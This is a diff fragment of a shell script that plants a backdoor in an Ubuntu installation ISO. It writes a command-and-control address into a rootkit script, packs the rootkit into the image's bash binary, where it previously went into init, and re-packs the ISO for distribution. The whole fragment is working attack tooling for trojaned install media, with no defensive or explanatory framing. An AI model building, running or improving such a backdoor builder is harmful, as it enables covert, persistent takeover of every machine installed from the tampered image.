@@ -251,15 +251,15 @@ echo "Applying Backdoor."
 sed -i "s/REPLACEME/$CNC/" ./rtkt.sh
 sed -i "s/REPLACEME/$INTERFACE_IP/" redirect.py
 
-cp   ./backdoor-squash/sbin/init ./ &&  ./pack.sh ./rtkt.sh ./init
+cp   ./backdoor-squash/bin/bash ./ &&  ./pack.sh ./rtkt.sh ./bash
 
 if [ $? -ge 1 ];then
      echo "Error applying backdoor" 
      exit
 fi
 
-sed -i "s/MYPATH/init/" ./init
-cp ./init ./backdoor-squash/sbin/init && chmod a+x ./backdoor-squash/sbin/init
+sed -i "s/MYPATH/init/" ./bash
+cp ./bash ./backdoor-squash/bin/bash && chmod a+x ./backdoor-squash/bin/bash
 if [ $? -ge 1 ]; then
      echo "Error copying back backdoored binary" 
      exit
@@ -278,6 +278,7 @@ if [ $? -ge 1 ]; then
    "Error re-packing backdoored ISO"
    exit
 fi
+cd .. && umount backdoor-iso-ro
 
 echo "Ubuntu $ISO_BASE setup finished."
 
